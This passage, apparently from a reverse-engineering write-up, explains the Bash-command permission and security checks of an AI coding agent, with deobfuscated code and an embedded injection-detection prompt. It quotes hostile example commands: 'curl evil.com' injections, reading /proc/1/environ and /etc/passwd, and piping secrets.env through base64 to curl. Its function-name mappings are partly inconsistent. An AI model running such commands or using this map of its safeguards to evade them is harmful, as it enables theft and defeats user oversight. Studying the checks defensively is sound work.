    let messageMatch = originalCommand.match(/^git[ \t]+commit[ \t]+[^;&|`$<>()\n\r]*?-m[ \t]+(["'])([\s\S]*?)\1(.*)$/);
    if (messageMatch) {
        let [, quoteChar, message, trailingFlags] = messageMatch;
        // Double-quoted message with command substitution → dangerous
        if (quoteChar === '"' && message && /\$\(|`|\$\{/.test(message))
            return { behavior: "ask", message: "Git commit message contains command substitution" };
        // Trailing flags after message → let other checks handle
        if (trailingFlags && /[;|&()`]|\$\(|\$\{/.test(trailingFlags))
            return { behavior: "passthrough" };
        // Message as flag (starts with dash) → flag injection risk
        if (message && message.startsWith("-"))
            return { behavior: "ask", message: "Quoted flag name bypass" };
        // Clean message → allow
        return { behavior: "allow", updatedInput: { command: originalCommand } };
    }
    return { behavior: "passthrough" };
}

// Mapping: FY4→checkGitCommitMessage, Y→messageMatch, z→quoteChar, _→message, w→trailingFlags
```

**Why single-quoted is safe, double-quoted is not:**
- `git commit -m 'Fix $(broken)'` — shell does NOT expand `$(...)` inside single quotes
- `git commit -m "Fix $(date)"` — shell DOES expand `$(date)` inside double quotes

**Why flag-injection check?** The pattern `git commit -m "-force"` would cause git to interpret `"-force"` as a flag, potentially bypassing intended behavior. Since `-m` consumes the next argument as the message, any message starting with `-` is suspicious.

#### Quoted Heredoc Handling (via gY4)

In v2.1.76, quoted heredocs (`<<'DELIM'` or `<<\DELIM`) are validated within `checkHeredocInSubstitution` (gY4) via the `Hg9` (isQuotedHeredocInSubstitution) helper function. This helper:

1. Matches `$(cat <<'DELIM'` or `$(cat <<\DELIM` patterns
2. Verifies proper closing delimiter structure
3. Returns `true` if all heredocs in command substitution use quoted/escaped delimiters

```javascript
// ============================================
// isQuotedHeredocInSubstitution - Validates quoted delimiter safety
// Location: chunks.91.mjs:1272
// ============================================

// READABLE (for understanding):
function isQuotedHeredocInSubstitution(command) {
    if (!HEREDOC_IN_SUBSTITUTION_PATTERN.test(command)) return false;

    // Find all $(cat <<'DELIM') or $(cat <<\DELIM) occurrences
    let quotedHeredocRegex = /\$\(cat[ \t]*<<(-?)[ \t]*(?:'+([A-Za-z_]\w*)'+|\\([A-Za-z_]\w*))/g;
    let matches = [], match;
    while ((match = quotedHeredocRegex.exec(command)) !== null) {
        let delim = match[2] || match[3];
        if (delim) matches.push({ start: match.index, delimiter: delim });
    }
    if (matches.length === 0) return false;

    // Verify each match has proper structure and no remaining dangerous patterns
    // ... (see full implementation in heredoc_security.md)
    return true;
}

// Mapping: Hg9→isQuotedHeredocInSubstitution, lV8→HEREDOC_IN_SUBSTITUTION_PATTERN
```

**Why quoted/escaped delimiters are safe:** In bash:
- `<<'EOF'` — single-quoted delimiter → heredoc content has NO variable expansion
- `<<\EOF` — escaped delimiter → same effect as single-quoted
- `<<EOF` — unquoted delimiter → content IS subject to variable expansion

The security system only needs to block heredocs where the content could execute code. Quoted/escaped delimiters guarantee the content is literal text.

---

### Phase B: Deny-List Checks

These run after allow-list checks. The first check to return `"ask"` wins.

**Deny-list order in `runSecurityChecks`:**
1. `pY4` — checkJqCommand
2. `rY4` — checkObfuscatedFlags
3. `QY4` — checkShellMetacharacters
4. `UY4` — checkDangerousVariables
5. `w01` — checkNewlines
6. `lY4` — checkIFSInjection
7. `iY4` — checkProcEnviron
8. `dY4` — checkDangerousPatterns
9. `_01` — checkRedirections
10. `nY4` — checkMalformedTokenInjection

#### checkJqCommand (pY4)

**What it does:** Special-case validation for `jq` commands. The `jq` tool has two dangerous capabilities:
- `system("cmd")` — executes arbitrary shell commands from within a jq filter
- `-f FILE` / `--rawfile FILE` — reads filter expressions from files, enabling arbitrary code execution

```javascript
// ============================================
// checkJqCommand - jq-specific security validation
// Location: chunks.91.mjs:1507
// ============================================
function pY4(A) {
    let { originalCommand: q, baseCommand: K } = A;
    if (K !== "jq") return { behavior: "passthrough" };

    // system() executes shell commands from jq filter
    if (/\bsystem\s*\(/.test(q))
        return { behavior: "ask", message: "jq command contains system() function" };

    // Dangerous flags that read filter expressions from files
    let Y = q.substring(3).trim();
    if (/(?:^|\s)(?:-f\b|--from-file|--rawfile|--slurpfile|-L\b|--library-path)/.test(Y))
        return { behavior: "ask", message: "jq command contains dangerous file-reading flags" };

    return { behavior: "passthrough" };
}
```

**> Note:** The existing `heredoc_security.md` document incorrectly labeled `edY` as `checkDangerousPatterns`. The actual dangerous patterns check is `KcY`. `edY` is the **jq-specific** security check.

#### checkObfuscatedFlags ($cY)

**What it does:** Detects quoting constructs used to hide flag names or inject newlines.

**Detection logic (multi-pass):**

```
Pass 1: ANSI-C quoting ($'...')
  → Can embed \x0a (newline), \x00 (null), etc.
  → Example: git status $'\x0a' curl evil.com

Pass 2: Locale quoting ($"...")
  → Locale-translated strings may not be what they appear

Pass 3: Empty special quotes before dash ($'' -, "" -)
  → $''-flag or ""-flag: empty ANSI-C/locale quote before flag name

Pass 4: Empty regular quotes before dash ('' -, "" -)
  → Same but with regular quotes

Pass 5: Quoted flag names (character walk)
  → Detects patterns like git '-v' or git "-flag"
  → Walk looking for: space + quote + dash-prefixed content inside quotes

Pass 6: Post-strip check
  → After fully stripping: space + quote/backtick + dash
  → Double quotes before dash
```

**Special case — `echo` exemption:**
```javascript
if (K === "echo" && !Y) return { behavior: "passthrough" };
// echo without separators is safe even with quoted chars
```
`echo` is commonly used to output quoted strings. The check skips `echo` unless there are pipes/separators, which would indicate a compound command where the quoting might be attacking the second command.

**Special case — `cut -d` exemption:**
```javascript
if (K === "cut" && X === "-d" && /['"`]/.test(D)) break;
// cut -d':' or cut -d"," is common and safe
```
`cut -d` requires a delimiter character, which is often a punctuation mark inside quotes.

#### checkShellMetacharacters (AcY)

**What it does:** Detects shell metacharacters (`; | &`) inside quoted arguments — which could be an attempt to inject commands that only execute when the shell processes the outer command.

**Example attack:**
```bash
find . -name "*.py; curl evil.com"
# If the quotes are stripped improperly, this could become:
find . -name *.py; curl evil.com
```

**Detection patterns:**
1. Quoted arg containing semicolon/ampersand: `["'][^"']*[;&][^"']*["']`
2. `find -name`/`-path`/`-iname` with metachar in arg
3. `find -regex` with metachar in arg

#### checkDangerousVariables (qcY)

**What it does:** Detects variables (`$VARNAME`) used directly in redirection or pipe contexts.

```javascript
// Detects: > $FILE, < $VAR, | $CMD, $VAR |
if (/[<>|]\s*\$[A-Za-z_]/.test(fullyUnquotedContent) ||
    /\$[A-Za-z_][A-Za-z0-9_]*\s*[|<>]/.test(fullyUnquotedContent))
    return { behavior: "ask" }
```

**Why this is dangerous:** Variable expansion in redirection targets can redirect output to attacker-controlled locations:
```bash
# If $LOGFILE is controlled via prompt injection:
npm test 2>&1 > $LOGFILE  # Could write to /etc/cron.d/evil
```

#### checkNewlines (YcY)

**What it does:** Detects embedded newlines that could hide additional commands.

**Algorithm:**
1. If no `\n` or `\r` in fully-unquoted content → safe
2. If a newline is followed by a command-like character → dangerous

```javascript
// After newline: letter, path chars, glob, subshell, redirect, etc.
if (/[\n\r]\s*[a-zA-Z/.~({$![>|]/.test(fullyUnquotedContent))
    return { behavior: "ask" }
```

**Attack example:**
```bash
git status
curl evil.com  # Hidden after newline
```

**Why the character class matters:** After a newline, the following characters start valid commands or redirections. The check excludes digits, hyphens, etc. that wouldn't start a dangerous second command.

#### checkIFSInjection (zcY)

**What it does:** Detects `$IFS` or `${...IFS...}` variable references.

**Attack:**
```bash
IFS=/ && cat$IFS/etc/passwd
# IFS changed to "/" — "cat/etc/passwd" becomes "cat" + "/etc/passwd"
# With modified IFS, field splitting works differently
```

The check applies to the **original command** (not quote-stripped) because IFS references are dangerous regardless of quoting context.

#### checkProcEnviron (wcY)

**What it does:** Blocks access to `/proc/*/environ`.

**Attack:**
```bash
cat /proc/1/environ  # Reads process environment of PID 1 (init)
# May expose secrets, tokens, credentials from other processes
```

#### checkDangerousPatterns (KcY)

**What it does:** The main catch-all for command substitution and process substitution patterns.

**Three-stage detection:**
1. **Backtick detection:** Uses `idY` (hasUnescapedChar) to find unescaped backticks
2. **Pattern list check:** Against `DANGEROUS_PATTERNS` array on `unquotedContent`
3. **Redirection check:** Against `fullyUnquotedContent` for `<` and `>`

```javascript
// DANGEROUS_PATTERNS array (ddY):
[
    { pattern: /<\(/, message: "process substitution <()" },
    { pattern: />\(/, message: "process substitution >()" },
    { pattern: /\$\(/, message: "$() command substitution" },
    { pattern: /\$\{/, message: "${} parameter substitution" },
    { pattern: /\$\[/, message: "$[] legacy arithmetic expansion" },
    { pattern: /~\[/, message: "Zsh-style parameter expansion" },
    { pattern: /\(e:/, message: "Zsh-style glob qualifiers" },
    { pattern: /<#/, message: "PowerShell comment syntax" }
]
```

**Why check unquotedContent (with double quotes) for patterns, but fullyUnquoted for redirects?**
- Patterns like `$(` and `${` are dangerous even inside double-quoted strings (they're still expanded)
- Redirection `<` and `>` are only dangerous outside all quotes — hence fully-unquoted check

#### checkMalformedTokenInjection (HcY)

**What it does:** Parses the command with the shell tokenizer and checks for unbalanced brackets in tokens that appear around command separators.

**Algorithm:**
1. Tokenize command via `shellTokenize` (pz)
2. If tokenization fails → passthrough (handled elsewhere)
3. Check if any `;`, `&&`, or `||` separators are present
4. If yes, call `pdY` (hasMalformedBrackets) on all tokens

**hasMalformedBrackets (pdY) logic:**
For each string token, count:
- `{` vs `}` — must be equal
- `(` vs `)` — must be equal
- `[` vs `]` — must be equal
- Unescaped `"` — count must be even
- Unescaped `'` — count must be even

If any counts are unbalanced, return `true` (malformed).

**Why this catches injections:** An injection attempt might produce:
```bash
git status; "echo injected
# The " is unbalanced in the token before ;
# pdY detects the unbalanced " and flags as malformed
```

---

### The runSecurityChecks Master Function (zg9)

```javascript
// ============================================
// runSecurityChecks - Master security validation pipeline
// Location: chunks.91.mjs:1104
// ============================================

// READABLE (for understanding):
async function runSecurityChecks(command) {
    // Pre-check: detect single-quote backslash bypass
    if (hasSingleQuotedBackslashBypass(command))
        return { behavior: "ask", message: "Single-quoted backslash bypass pattern" };

    let baseCommand = command.split(" ")[0] || "";
    let { withDoubleQuotes, fullyUnquoted, unquotedKeepQuoteChars } = stripQuotes(command, baseCommand === "jq");
    let context = {
        originalCommand: command,
        baseCommand,
        unquotedContent: withDoubleQuotes,        // single quotes removed
        fullyUnquotedContent: stripRedirections(fullyUnquoted),  // both quotes removed + safe redirects stripped
        fullyUnquotedPreStrip: fullyUnquoted       // before redirect stripping
    };

    // Phase A: Allow-list (first match wins with "allow")
    for (let check of [checkEmptyCommand, checkIncompleteCommand,
                       checkHeredocInSubstitution, checkGitCommitMessage]) {
        let result = check(context);
        if (result.behavior === "allow")
            return { behavior: "passthrough", message: result.decisionReason?.reason };
        if (result.behavior !== "passthrough") return result;
    }

    // Phase B: Deny-list (first "ask" wins)
    for (let check of [checkJqCommand, checkObfuscatedFlags, checkShellMetacharacters,
                       checkDangerousVariables, checkNewlines, checkIFSInjection,
                       checkProcEnviron, checkDangerousPatterns, checkRedirections,
                       checkMalformedTokenInjection]) {
        let result = check(context);
        if (result.behavior === "ask") return result;
    }

    return { behavior: "passthrough", message: "Command passed all security checks" };
}

// Mapping: zg9→runSecurityChecks, CY8→hasSingleQuotedBackslashBypass,
//   UY4→stripQuotes, xY4→stripRedirections,
//   uY4→checkEmptyCommand, mY4→checkIncompleteCommand,
//   gY4→checkHeredocInSubstitution, FY4→checkGitCommitMessage,
//   pY4→checkJqCommand, rY4→checkObfuscatedFlags, QY4→checkShellMetacharacters,
//   UY4→checkDangerousVariables, w01→checkNewlines, lY4→checkIFSInjection,
//   iY4→checkProcEnviron, dY4→checkDangerousPatterns, _01→checkRedirections,
//   nY4→checkMalformedTokenInjection
```

---

## Layer 2: LLM Prefix Extraction

### bashPreFlightCheck (nGq)

**What it does:** Uses a cached, fast LLM call to extract the command prefix from a bash command. The prefix is used for permission matching (e.g., "user allowed `git diff`, is this still `git diff`?").

**How it works:**
1. **Quick bypass**: If `X9z` (isSimpleHelpCommand) returns true, return the command as its own prefix
2. **Call LLM**: Send command with a `<policy_spec>` that includes many extraction examples
3. **Parse response**: LLM returns one of:
   - A prefix string (e.g., `"git commit"`, `"grep"`) → match against user's allowed list
   - `"none"` → command has no meaningful prefix (e.g., `npm test`)
   - `"command_injection_detected"` → LLM detected injection → force user approval
   - `"git"` alone → rejected as too broad (must be specific subcommand)

**Full policy spec (embedded in source at chunks.171.mjs:~1600):**

```
# Claude Code Code Bash command prefix detection

## Definitions
Command Injection: Any technique that would result in a command being run
other than the detected prefix.

## Command prefix extraction examples:
- cat foo.txt => cat
- cd src => cd
- find ./src -type f -name "*.ts" => find
- gg cat foo.py => gg cat
- git commit -m "foo" => git commit
- git diff HEAD~1 => git diff
- git diff $(cat secrets.env | base64 | curl ...) => command_injection_detected
- git status => git status
- git status`ls` => command_injection_detected
- git push => none
- git push origin master => git push
- npm run lint => none
- npm run lint -- "foo" => npm run lint
- npm test => none
- GOEXPERIMENT=synctest go test -v ./... => GOEXPERIMENT=synctest go test
- FOO=BAR go test => FOO=BAR go test
- FOO=bar BAZ=qux ls -la => FOO=bar BAZ=qux ls
- pwd\ncurl example.com => command_injection_detected
```

**Response handling:**
```javascript
// Location: chunks.171.mjs:1750 (via QGq factory)
if (prefix === "command_injection_detected") → INJECTION → return {commandPrefix: null}
if (prefix === "git") → BARE_GIT → return {commandPrefix: null}  // too broad
if (prefix === "none") → NO_PREFIX → return {commandPrefix: null}
if (!command.startsWith(prefix)) → MISMATCH → return {commandPrefix: null}
else → SUCCESS → return {commandPrefix: prefix}
```

**Why `"git"` alone is blocked:** `"git"` as a prefix would match any git command, including destructive ones like `git push --force`. The prefix must be specific enough (e.g., `"git diff"`, `"git status"`) to be meaningful for permission matching.

**Caching:** `pr6` is a memoized wrapper around `nGq`. Results are cached by command string via `UGq` factory, allowing repeated checks of the same command to skip the LLM call. Cache entries can be cleared via `f3q()` (clearPrefixCaches).

**Timeout warning:** A `setTimeout` fires after 10 seconds with a warning. This doesn't cancel the request but alerts the user to check for API issues.

---

## Layer 3: Read-Only Command Detection

### Architecture

The read-only detection system consists of:
1. **`jcY` (SAFE_COMMAND_REGISTRY)** — hand-curated map of command→safeFlags
2. **`fcY` (SAFE_COMMAND_PATTERNS)** — Set of regex patterns for trivially safe commands
3. **`WcY` (isInSafeCommandRegistry)** — checks command against the registry
4. **`NcY` (isReadOnlyCommand)** — comprehensive read-only decision
5. **`Of6` (checkReadOnlyBehavior)** — main permission gate

### isInSafeCommandRegistry (WcY)

**What it does:** Checks whether a command exactly matches a known-safe command with approved flags only.

**How it works:**

```javascript
// ============================================
// isInSafeCommandRegistry - Flag-level safe command validation
// Location: chunks.150.mjs:680
// ============================================

// READABLE (for understanding):
function isInSafeCommandRegistry(command) {
    // Remove trailing "2>&1" (safe redirect)
    let trimmed = command.trim();
    if (trimmed.endsWith(" 2>&1")) trimmed = trimmed.slice(0, -5).trim();

    // Skip Windows UNC paths (\\server\share) — not a security concern but flagged
    if (isWindowsUncPath(trimmed)) return false;

    // Skip commands with glob patterns (* ? [ ]) — can't safely validate
    if (containsGlobPattern(trimmed)) return false;

    // Check against registry
    if (isRegistryMatch(trimmed)) return true;

    // Check against regex patterns (simple commands like pwd, echo, etc.)
    for (let pattern of SAFE_COMMAND_PATTERNS)
        if (pattern.test(trimmed)) {
            // Special git exceptions
            if (trimmed.includes("git") && /\s-c[\s=]/.test(trimmed)) return false;    // git -c configures
            if (trimmed.includes("git") && /\s--exec-path[\s=]/.test(trimmed)) return false;
            if (trimmed.includes("git") && /\s--config-env[\s=]/.test(trimmed)) return false;
            return true;
        }
    return false;
}
```

**Registry matching logic (isRegistryMatch / WcY core):**
1. Tokenize command via `shellTokenize` (pz)
2. Convert tokens to strings (treating globs as their pattern)
3. Find the longest matching prefix in `SAFE_COMMAND_REGISTRY`
4. For each remaining token: validate it's an approved flag with appropriate argument type
5. Special handling for combined flags (`-nA` = `-n` + `-A`)
6. Check `additionalCommandIsDangerousCallback` if defined (e.g., for `git branch`)

**Flag type system:**
| Type | Meaning |
|------|---------|
| `"none"` | Flag takes no argument |
| `"string"` | Flag takes a string argument (checked for leading `-`) |
| `"number"` | Flag takes a numeric argument |
| `"char"` | Flag takes a single character |
| `"EOF"` | Flag takes "EOF" specifically |
| `"{}"` | Flag takes "{}" specifically |

**Special cases in WcY:**
- `git -n NUMBER`: git supports `-N` numeric flags (git log -5)
- `grep`/`rg` combined flags: `-A5` is treated as `-A` + `5`
- `git ls-remote URL`: URLs with `://`, `@`, `:` are rejected (external network call)

### SAFE_COMMAND_REGISTRY (jcY) — Full Command List

The registry covers:
- `xargs` — with safe parallelism/batch flags
- `git diff`, `git log`, `git show`, `git shortlog`, `git reflog` — read-only git views
- `git stash list`, `git stash show` — stash inspection
- `git ls-remote`, `git ls-files` — listing
- `git status`, `git blame`, `git grep` — working tree queries
- `git config --get` — config reading (not writing)
- `git remote show`, `git remote` — remote info (view only)
- `git merge-base`, `git rev-parse`, `git rev-list` — commit graph queries
- `git describe`, `git cat-file` — object inspection
- `git for-each-ref`, `git tag` — ref listing (read-only flags only)
- `git branch` — branch listing (with `additionalCommandIsDangerousCallback` to block modifications)
- `git worktree list` — worktree info
- Docker read commands: `docker ps`, `docker images`, `docker stats`, `docker diff`, `docker port`
- `docker compose ps`, `docker compose top`, `docker compose config`, `docker compose logs`
- `docker logs`, `docker inspect`

### SAFE_COMMAND_PATTERNS (fcY) — Regex Allow-List

Simple commands that are always safe regardless of arguments:

```
ZcY (simple list): cal, uptime, cat, head, tail, wc, stat, strings, hexdump,
  od, nl, id, uname, free, df, du, locale, groups, nproc, docker ps, docker images,
  basename, dirname, realpath, cut, paste, tr, column, tac, rev, fold, expand,
  unexpand, readlink, diff, true, false, sleep, which, type

Specific patterns:
- echo (safe without separators, no $)
- claude -h / claude --help
- uniq with common flags
- pwd
- whoami
- node -v / npm -v / python --version / python3 --version
- history [N]
- alias
- arch [--help]
- ip addr
- ifconfig [interface]
- jq (without dangerous flags)
- cd [path]
- ls [args]
- find (without -exec, -delete, -ok, -fprint)
```

### isReadOnlyCommand (NcY)

**What it does:** Comprehensive check that combines multiple approaches to determine if a command is read-only.

```javascript
// ============================================
// isReadOnlyCommand - Comprehensive read-only check
// Location: chunks.150.mjs:831
// ============================================
function isReadOnlyCommand(command) {
    let trimmed = command.trim();
    if (trimmed.endsWith(" 2>&1")) trimmed = trimmed.slice(0, -5).trim();

    // Windows UNC paths → not read-only (external network)
    if (isWindowsUncPath(trimmed)) return false;

    // Glob patterns → can't safely validate
    if (containsGlobPattern(trimmed)) return false;

    // Registry match → read-only confirmed
    if (isInSafeCommandRegistry(trimmed)) return true;

    // Pattern match → read-only confirmed (with git exceptions)
    for (let pattern of SAFE_COMMAND_PATTERNS)
        if (pattern.test(trimmed)) {
            if (trimmed.includes("git") && /\s-c[\s=]/.test(trimmed)) return false;
            if (trimmed.includes("git") && /\s--exec-path[\s=]/.test(trimmed)) return false;
            if (trimmed.includes("git") && /\s--config-env[\s=]/.test(trimmed)) return false;
            return true;
        }
    return false;
}
```

### checkReadOnlyBehavior (Of6)

**What it does:** The main permission gate for Bash tool calls. Determines if a command can be auto-allowed as a read-only operation.

```javascript
// ============================================
// checkReadOnlyBehavior - Main read-only permission gate
// Location: chunks.150.mjs:881
// ============================================

// ORIGINAL (for source lookup):
function Of6(A, q) {
    let { command: K } = A;
    if (!pz(K, (H) => `$${H}`).success) return { behavior: "passthrough", ... };
    if (lm(K).behavior !== "passthrough") return { behavior: "passthrough", ... };
    if ($f6(K)) return { behavior: "ask", message: "Windows UNC path (WebDAV attack)" };
    let z = vcY(K);
    if (q && z) return { behavior: "passthrough", ... };  // cd+git compound with prompt
    if (z && EcY()) return { behavior: "passthrough", ... };  // git in bare repo
    if (AD(K).every((H) => { if (lm(H).behavior !== "passthrough") return !1; return NcY(H) }))
        return { behavior: "allow", updatedInput: A };
    return { behavior: "passthrough", ... }
}

// READABLE (for understanding):
function checkReadOnlyBehavior(toolInput, hasPromptContext) {
    let { command } = toolInput;

    // Must be parseable
    if (!shellTokenize(command).success)
        return { behavior: "passthrough", message: "Cannot parse, needs permission check" };

    // Must pass static security checks
    if (runSecurityChecks(command).behavior !== "passthrough")
        return { behavior: "passthrough", message: "Not read-only, needs permission check" };

    // Windows UNC path → potential WebDAV attack
    if (isWindowsUncPath(command))
        return { behavior: "ask", message: "Windows UNC path" };

    let hasGit = containsGitSubcommand(command);

    // Compound cd + git with user prompt context → needs permission check
    if (hasPromptContext && hasGit)
        return { behavior: "passthrough", message: "cd+git compound needs check" };

    // Git in bare repo structure → might affect git objects
    if (hasGit && isBareGitRepo())
        return { behavior: "passthrough", message: "git in bare repo needs check" };

    // All subcommands must be read-only
    if (extractSubcommands(command).every(sub =>
        runSecurityChecks(sub).behavior === "passthrough" && isReadOnlyCommand(sub)))
        return { behavior: "allow", updatedInput: toolInput };

    return { behavior: "passthrough", message: "Not read-only, needs permission check" };
}

// Mapping: Of6→checkReadOnlyBehavior, lm→runSecurityChecks, $f6→isWindowsUncPath,
//   vcY→containsGitSubcommand, EcY→isBareGitRepo, AD→extractSubcommands, NcY→isReadOnlyCommand
```

**Decision flow:**
```
command parseable?     NO  → passthrough (needs normal check)
     │ YES
security passes?       NO  → passthrough
     │ YES
Windows UNC path?      YES → ask
     │ NO
has git + prompt ctx?  YES → passthrough (conservative for cd+git)
     │ NO
git in bare repo?      YES → passthrough
     │ NO
all subcommands RO?    YES → allow (auto-approve)
     │ NO
                       → passthrough
```

### Windows UNC Path Detection ($f6)

**What it does:** Detects Windows UNC paths (`\\server\share`) on Windows systems, which can trigger WebDAV requests to attacker-controlled SMB servers.

**Attack:** When git is run with a UNC path on Windows, it may send NTLM authentication credentials to the attacker's SMB server. This is a well-known Windows-specific attack vector.

---

## Sed Validation Subsystem

The sed validation is one of the most complex subsystems — a complete mini-parser for sed commands.

### Architecture

```
sed command
    │
    ├─ extractSedExpressions (XcY) ── finds -e scripts
    │                                  and first positional arg
    ├─ sedHasFileRedirection (JcY) ── detects -e that reads files
    │
    ├─ isSafeReadOnlySed (OcY) ─────  validates read patterns (p)
    │
    ├─ isSafeSubstituteSed (J6q) ─── validates s/ substitution
    │
    └─ isDangerousSedExpression (DcY) ─ validates individual expressions
```

### extractSedExpressions (XcY)

**What it does:** Extracts all sed script expressions from a sed command (from `-e` flags and the first positional argument).

**Algorithm:**
1. Match `sed ` prefix
2. Reject dangerous flag combinations: `-ew`, `-we`, `-wE` (write + expression combinations)
3. Tokenize the remaining part
4. Walk tokens:
   - `-e EXPR` or `--expression=EXPR` → add to expressions
   - First non-flag, non-`-e` argument → implicit expression (if no `-e` was seen)
5. Return expression list

### isDangerousSedExpression (DcY)

**What it does:** Validates an individual sed expression for safety. Returns `true` if dangerous.

**Checks performed:**
1. Non-ASCII characters → dangerous
2. `{` or `}` in expression → might be compound command
3. Contains literal newline → multi-line sed script
4. `#` comment that's not preceded by `s` (the `s` command can have `#` in pattern) → dangerous
5. `!` addressing (negative address): `!p`, `/pat/!d`
6. `~` step addressing: `0~2p` (every other line)
7. Leading `,` (range from line 0)
8. `,+N` or `,-N` relative range
9. `s\\` or `\\|` or `\\%` or `\\@` (alternate substitution delimiters)
10. `\\/.../w` (write to file within regex)
11. `/pattern  w FILE` (write flag in sed expression)
12. Malformed `s/` expression (not exactly `s/PATTERN/REPLACE/FLAGS`)
13. `w` or `W` flags in substitution → writes to file
14. `e` or `E` flags in substitution → executes shell command
15. `y///` with write/execute flags

**Why this complexity?** Sed has dozens of commands and features. The validation must handle:
- Multiple addressing forms (`N`, `N,M`, `/pat/`, `/pat/,/pat2/`, `N~M`)
- Multiple command forms (`p`, `d`, `s///`, `y///`, `q`, etc.)
- Multiple flag forms per command
- File-writing commands (`w`, `W`)
- Shell execution commands (`e`, `R`)

### validateSedCommand (QU1)

**What it does:** The master sed validation function — combines all sed sub-checks.

```javascript
// ============================================
// validateSedCommand - Master sed safety check
// Location: chunks.150.mjs:493
// ============================================
function validateSedCommand(command, options) {
    let allowFileWrites = options?.allowFileWrites ?? false;

    try {
        let expressions = extractSedExpressions(command);  // may throw
        let hasFileRedirection = sedHasFileRedirection(command);

        let isReadOnly = false, isSafeSubstitute = false;
        if (allowFileWrites) {
            isSafeSubstitute = isSafeSubstituteSed(command, expressions, hasFileRedirection,
                                                    { allowFileWrites: true });
        } else {
            isReadOnly = isSafeReadOnlySed(command, expressions);
            isSafeSubstitute = isSafeSubstituteSed(command, expressions, hasFileRedirection);
        }

        if (!isReadOnly && !isSafeSubstitute) return false;

        // Additional expression-level checks
        for (let expr of expressions) {
            if (isSafeSubstitute && expr.includes(";")) return false;
        }
        for (let expr of expressions) {
            if (isDangerousSedExpression(expr)) return false;
        }

        return true;
    } catch { return false; }
}
```

**Integration with permissions:**
```javascript
// checkSedCommand (D6q) — called from permission system:
function checkSedCommand(toolInput, permissionMode) {
    let subcommands = extractSubcommands(toolInput.command);
    for (let sub of subcommands) {
        if (!sub.trim().split(/\s+/)[0] === "sed") continue;
        let allowFileWrites = permissionMode.mode === "acceptEdits";
        if (!validateSedCommand(sub, { allowFileWrites }))
            return { behavior: "ask", message: "sed requires approval" };
    }
    return { behavior: "passthrough" };
}
```

**The `allowFileWrites` distinction:** In "accept edits" mode (when the user has pre-approved file modifications), `sed -i` (in-place editing) is allowed. In standard mode, only read-only `sed` patterns are permitted.

---

## Shell Tokenization Layer

### parseShellCommand (bW6) — Sentinel-Based Tokenization

**What it does:** Converts a shell command string into a list of tokens, while safely handling heredocs, escaped characters, and special quoting that would confuse the underlying tokenizer.

**Algorithm:**
1. Generate random sentinels (collision-safe placeholders) via `iGq()`
2. Extract heredocs via `ca()` and replace with `__HEREDOC_N_HEX__` placeholders
3. Normalize line continuations (`\<newline>` → collapse)
4. Insert sentinels adjacent to quote chars:
   - `"` → `"__DOUBLE_QUOTE_HEX__` (quote char stays, sentinel marks its presence)
   - `'` → `'__SINGLE_QUOTE_HEX__`
   - `\n` → `\n__NEW_LINE_HEX__\n`
   - `\(` → `__ESCAPED_OPEN_PAREN_HEX__`
   - `\)` → `__ESCAPED_CLOSE_PAREN_HEX__`
5. Run shell tokenizer (`Fz`) with variable expansion handler
6. If tokenization fails → fallback: return `[originalCommand]` with heredocs restored
7. Recombine tokens split by the NEW_LINE sentinel
8. Strip sentinel text from all tokens (restore original chars)
9. Restore heredocs from placeholders

```javascript
// ============================================
// generateSentinels - Create collision-safe placeholder strings
// Location: chunks.171.mjs:1121
// ============================================
function iGq() {
    let A = J9z(8).toString("hex");  // 8 random bytes → 16-char hex
    return {
        SINGLE_QUOTE: `__SINGLE_QUOTE_${A}__`,
        DOUBLE_QUOTE: `__DOUBLE_QUOTE_${A}__`,
        NEW_LINE: `__NEW_LINE_${A}__`,
        ESCAPED_OPEN_PAREN: `__ESCAPED_OPEN_PAREN_${A}__`,
        ESCAPED_CLOSE_PAREN: `__ESCAPED_CLOSE_PAREN_${A}__`
    }
}

// ============================================
// parseShellCommand - Tokenize with heredoc preservation
// Location: chunks.171.mjs:1139
// ============================================

// ORIGINAL (for source lookup):
function bW6(A) {
    let q = [],
        K = iGq(),
        { processedCommand: Y, heredocs: z } = ca(A),
        _ = Y.replace(/\\+\n/g, (H) => {
            let j = H.length - 1;
            if (j % 2 === 1) return "\\".repeat(j - 1);
            else return H
        }),
        w = Fz(_.replaceAll('"', `"${K.DOUBLE_QUOTE}`).replaceAll("'", `'${K.SINGLE_QUOTE}`)
               .replaceAll("\n", `\n${K.NEW_LINE}\n`)
               .replaceAll("\\(", K.ESCAPED_OPEN_PAREN)
               .replaceAll("\\)", K.ESCAPED_CLOSE_PAREN),
            (H) => `$${H}`);
    if (!w.success) return [A];
    // ... recombine and restore ...
    return aw8(_, z)  // restoreHeredocsInList
}

// Mapping: bW6→parseShellCommand, iGq→generateSentinels, ca→extractHeredocs,
//   Fz→shellTokenize, aw8→restoreHeredocsInList
```

**Why sentinel-based approach?**

The external `bash-parser` tokenizer (`Fz`) consumes and removes quotes during tokenization. But the security system needs to see the original quoting to detect attacks. The sentinels preserve quote information:

```
Input:  git commit -m "Fix $(bug)"
After:  git commit -m "__DQ__Fix $(bug)__DQ__"
Tokenized: ["git", "commit", "-m", '"__DQ__Fix $(bug)__DQ__"']
After restore: ["git", "commit", "-m", '"Fix $(bug)"']
```

The security check can now see that `$(bug)` is inside a double-quoted string.

### extractSubcommands (EO)

**What it does:** Splits a compound command into individual subcommands by removing redirections and separating at `&&`, `||`, `;`, `|`.

**Algorithm:**
1. Tokenize via `bW6` (parseShellCommand)
2. Walk tokens, removing redirect sequences:
   - `>&`, `>`, `>>` followed by a safe target → remove operator + target
   - `>&` followed by file descriptor → remove
   - `2>` / `1>` → file descriptor redirects
3. Filter out undefined/empty tokens and separator operators via `D9z` (filterSeparatorTokens)

```javascript
// ============================================
// extractSubcommands - Split compound commands
// Location: chunks.171.mjs:1202
// ============================================

// ORIGINAL (for source lookup):
function EO(A) {
    let q = bW6(A);
    for (let Y = 0; Y < q.length; Y++) {
        let z = q[Y];
        if (z === ">&" || z === ">" || z === ">>") {
            // Check for safe redirection targets...
            if (M9z(j)) { q[Y] = void 0; q[Y+1] = void 0; }
        }
    }
    let K = q.filter((Y) => Y !== void 0 && Y !== "");
    return D9z(K)
}

// READABLE (for understanding):
function extractSubcommands(command) {
    let tokens = parseShellCommand(command);
    // Walk tokens removing safe redirections...
    return filterSeparatorTokens(filtered);
}

// Mapping: EO→extractSubcommands, bW6→parseShellCommand, M9z→isSimplePath, D9z→filterSeparatorTokens
```

**Key helper — isSimplePath (M9z):**
```javascript
// Location: chunks.171.mjs:1132
function M9z(A) {
    if (/[\s'"]/.test(A)) return false;
    if (A.length === 0) return false;
    if (A.startsWith("#")) return false;
